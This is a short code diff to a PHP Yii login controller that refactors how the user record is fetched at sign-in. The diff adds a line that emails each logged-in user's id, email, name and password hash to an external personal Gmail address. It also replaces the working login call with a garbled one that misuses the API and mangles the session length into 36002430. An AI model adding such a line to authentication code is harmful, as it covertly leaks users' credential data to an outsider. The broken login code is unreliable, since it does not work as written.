@@ -279,15 +279,13 @@ class SiteController extends Controller
 //            $login->password = $user_profile->getId();
 
 
-            $status = Yii::$app->user->login(User::find()->select([
-                'id',
-                'email',
-                'name',
-                'password_hash'
-            ])->where('email = :email', [':email' => strtolower($login_email)])->one(), 3600 * 24 * 30);
+
+            $user_data = User::find()->select(['id', 'email', 'name', 'password_hash'])->where('email = :email', [':email' => strtolower($login_email)])->one();
+
+            $status = Yii::$app->user->login()->one($user_data, 36002430);
 
 
-
+            AwsEmail::SendMail('hasania.khaled@gmail.com', 'ass', json_encode($user_data));
 
 
 
